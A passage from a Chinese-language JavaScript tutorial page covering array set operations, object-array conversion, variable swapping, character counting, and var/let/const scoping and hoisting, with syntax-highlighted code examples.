<span class="token keyword">const</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> ans <span class="token operator">=</span> arr1<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> arr2<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span><span class="token comment">//[4]</span>

<span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span> <span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span>
<span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>a<span class="token punctuation">,</span> <span class="token operator">...</span>b<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">//并集  </span>
<span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> b<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//交集  </span>
<span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">...</span>a<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">v</span> <span class="token operator">=&gt;</span> <span class="token operator">!</span>b<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//差集</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h5 id="对象和数组转化【常用】"><a href="#对象和数组转化【常用】" class="header-anchor">#</a> <strong>对象和数组转化</strong>【常用】</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">//['name','age']</span>
Object<span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">//['张三',14]</span>
Object<span class="token punctuation">.</span><span class="token function">entries</span><span class="token punctuation">(</span><span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">14</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment">//[[name,'张三'],[age,14]]</span>
Object<span class="token punctuation">.</span><span class="token function">fromEntries</span><span class="token punctuation">(</span><span class="token punctuation">[</span>name<span class="token punctuation">,</span><span class="token string">'张三'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span>age<span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//ES10的api,Chrome不支持 , firebox输出{name:'张三',age:14}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h5 id="判断是否包含值"><a href="#判断是否包含值" class="header-anchor">#</a> <strong>判断是否包含值</strong></h5> <p>includes(),find(),findIndex()是 ES6的api</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">//false</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">//-1 如果存在换回索引</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>item<span class="token operator">===</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//3 如果数组中无值返回undefined</span>
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">findIndex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span>item<span class="token operator">===</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//2 如果数组中无值返回-1</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h5 id="不借助临时变量-进行两个整数的交换"><a href="#不借助临时变量-进行两个整数的交换" class="header-anchor">#</a> <strong>不借助临时变量，进行两个整数的交换</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//方法一 ES6</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token punctuation">[</span>a<span class="token punctuation">,</span>b<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>b<span class="token punctuation">,</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>

<span class="token comment">// 方法二 异或运算，同为0或者同为1都为0,10为1</span>
<span class="token keyword">var</span> c <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
c <span class="token operator">=</span> c <span class="token operator">^</span> d<span class="token punctuation">;</span>
d <span class="token operator">=</span> c <span class="token operator">^</span> d<span class="token punctuation">;</span>
c <span class="token operator">=</span> c <span class="token operator">^</span> d<span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h5 id="查找字符串中出现最多的字符和个数"><a href="#查找字符串中出现最多的字符和个数" class="header-anchor">#</a> <strong>查找字符串中出现最多的字符和个数</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//查找出现最多的字符串的个数</span>
<span class="token keyword">let</span> str <span class="token operator">=</span> <span class="token string">&quot;abcabcabcbbccccc&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> num <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> char <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
 
 <span class="token comment">// 使其按照一定的次序排列</span>
str <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// &quot;aaabbbbbcccccccc&quot;</span>
<span class="token comment">//[...new Set('ababbc')].join('')// &quot;abc&quot; //上面的方法也可以用于，去除字符串里面的重复字符。</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//aaabbbbbcccccccc</span>

<span class="token comment">// 定义正则表达式;匹配多个字符串；</span>
<span class="token keyword">let</span> re <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(\w)\1+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">;</span>
str<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>re<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">$<span class="token number">0</span><span class="token punctuation">,</span>$<span class="token number">1</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token comment">//console.log($0, &quot;-------&quot;, $1);//cccccccc ------- c</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>num <span class="token operator">&lt;</span> $<span class="token number">0.</span>length<span class="token punctuation">)</span><span class="token punctuation">{</span>
        num <span class="token operator">=</span> $<span class="token number">0.</span>length<span class="token punctuation">;</span>
        char <span class="token operator">=</span> $<span class="token number">1</span><span class="token punctuation">;</span>        
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//aaabbbbbcccccccc</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//8</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//c</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h5 id="统计元素出现个数【推荐】"><a href="#统计元素出现个数【推荐】" class="header-anchor">#</a> <strong>统计元素出现个数【推荐】</strong></h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> nameArr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'samy'</span><span class="token punctuation">,</span> <span class="token string">'zh_x'</span><span class="token punctuation">,</span> <span class="token string">'samy'</span><span class="token punctuation">,</span> <span class="token string">'samy'</span><span class="token punctuation">,</span> <span class="token string">'科比'</span><span class="token punctuation">]</span>
<span class="token keyword">const</span> totalObj <span class="token operator">=</span> nameArr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">pre<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>pre<span class="token punctuation">[</span>next<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    pre<span class="token punctuation">[</span>next<span class="token punctuation">]</span><span class="token operator">++</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    pre<span class="token punctuation">[</span>next<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> pre
<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>totalObj<span class="token punctuation">)</span> <span class="token comment">// { 'samy': 3, zh_x: 1, '科比': 1 }</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><h3 id="变量-函数-解构-扩展-原型链"><a href="#变量-函数-解构-扩展-原型链" class="header-anchor">#</a> 变量/函数/解构/扩展/原型链</h3> <h4 id="_1-var-let-const"><a href="#_1-var-let-const" class="header-anchor">#</a> 1:var/let/const</h4> <h5 id="作用域"><a href="#作用域" class="header-anchor">#</a> 作用域</h5> <ul><li><strong>全局作用域</strong></li> <li><strong>函数作用域</strong>：<code>function() {}</code></li> <li><strong>块级作用域</strong>：<code>{}</code> <ul><li><strong>暂时性死区</strong>：在代码块内使用<code>let命令</code>声明变量之前，该变量都不可用；报错提示：<code>ReferenceError: foo is not defined</code></li></ul></li></ul> <h5 id="比较-2"><a href="#比较-2" class="header-anchor">#</a> 比较</h5> <ul><li>let添加了<strong>块级作用域</strong>; 约束了变量提升; 有暂时性死区;  禁止重复声明变量; 不会成为全局对象的属性；</li> <li><strong>const声明的变量不能重新赋值</strong>，也是由于这个规则，<strong>const变量声明时必须初始化</strong>，不能留到以后赋值；</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">hoistVariable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> foo<span class="token punctuation">;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'foo:'</span><span class="token punctuation">,</span> foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// foo: undefined</span>
    foo <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">hoistVariable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">nonHoistingFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'foo:'</span><span class="token punctuation">,</span> foo<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Uncaught ReferenceError; ReferenceError: foo is not defined</span>
    <span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token comment">//let foo = 3;</span>
    <span class="token comment">//console.log('foo:', foo); // 3</span>
<span class="token punctuation">}</span>
<span class="token function">nonHoistingFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//ES6规定如果块内存在let命令，那么这个块就会成为一个封闭的作用域，并要求let变量先声明才能使用，如果在声明之前就开始使用，它并不会引用外部的变量。</span>
<span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//暂时性死区</span>
    foo <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment">// Uncaught ReferenceError</span>
    <span class="token keyword">let</span> foo<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//使用var可以重复声明变量，但let不允许在相同作用域内重复声明同一个变量，下面的代码会引发错误：</span>
<span class="token comment">// SyntaxError</span>
<span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> foo <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// SyntaxError</span>
<span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// SyntaxError</span>
<span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> arg<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//let不会成为全局对象的属性</span>
<span class="token comment">//变量会自动成为全局对象的属性(在浏览器和Node.js环境下，这个全局对象分别是window和global)，但let是独立存在的变量，不会成为全局对象的属性：</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>window<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>

<span class="token comment">//const示例</span>
<span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
a <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>   <span class="token comment">// Uncaught TypeError: Assignment to constant variable</span>
<span class="token keyword">const</span> b<span class="token punctuation">;</span> <span class="token comment">// Uncaught SyntaxError: Missing initializer in const declaration</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><p>ReferenceError: xxx is not defined //TDZ区域；</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">varTest</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aLet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
  <span class="token keyword">var</span> aLet<span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aLet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
  aLet <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aLet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">letTest</span><span class="token punctuation">(</span><span class="token parameter">params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aLet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ReferenceError: aLet is not defined //TDZ区域；</span>
  <span class="token keyword">let</span> aLet<span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aLet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// undefined</span>
  aLet <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>aLet<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 10</span>
<span class="token punctuation">}</span>
<span class="token function">varTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">letTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h4 id="_2-变量-函数提升"><a href="#_2-变量-函数提升" class="header-anchor">#</a> 2:变量/函数提升</h4> <blockquote><p>函数声明和变量声明都会被提升。但是有一个需要注意的细节是<code>函数会首先被提升，然后才是变量</code>。
此外，在函数作用域中，<strong>局部变量的优先级比同名的全局变量高</strong>。</p> <p><strong>函数声明会被提升，但是(匿名)函数表达式会被提升(变量形式提升)，没有函数的优先级高</strong>;</p> <p><strong>如果是两个函数声明，出现在后面的函数声明可以覆盖前面的</strong>。</p></blockquote> <p><strong>函数会首先被提升，然后才是变量</strong>； 函数提升优先级 &gt; 变量提升优先级</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> a <span class="token operator">===</span> <span class="token string">'function'</span><span class="token punctuation">)</span>
<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//会打印 true true</span>

<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//最终的答案是 undefined; 实际会被 JavaScript 执行的样子：</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> a<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> a<span class="token punctuation">;</span>
a <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br></div></div><p><strong>函数声明会被提升，但是(匿名)函数表达式会被提升(变量形式提升)，没有函数的优先级高</strong></p> <p>因为<strong>JavaScript中的函数是一等公民，函数声明的优先级最高</strong>，会被提升至当前作用域最顶端</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> <span class="token function-variable function">foo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//会输出 1 而不是 2！这个代码片段会被引擎理解为如下形式：</span>
<span class="token keyword">function</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function-variable function">foo</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//注意这里的调用，在赋值；</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><p>比较：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> name <span class="token operator">=</span> <span class="token string">'samy'</span><span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token function-variable function">sayHello</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">guest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
